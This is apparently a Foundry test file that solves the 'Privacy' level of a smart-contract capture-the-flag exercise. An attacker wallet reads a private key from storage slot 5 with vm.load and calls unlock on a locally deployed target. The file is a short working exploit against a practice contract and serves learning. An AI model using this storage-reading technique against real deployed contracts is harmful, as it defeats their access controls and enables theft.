// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/Level12.sol";

contract Level12Test is Test {
    Privacy public target;
    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        bytes32[3] memory data = [
            bytes32("1secret"),
            bytes32("2secret"),
            bytes32("3secret")
        ];
        target = new Privacy(data);
    }

    function test_getContractOwnership() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(target));
        vm.stopPrank();

        assertFalse(target.locked());
    }

    function exploit(address _target) private {
        bytes32 slotContent = vm.load(_target, bytes32(uint256(5)));
        Privacy(_target).unlock(bytes16(slotContent));
    }
}
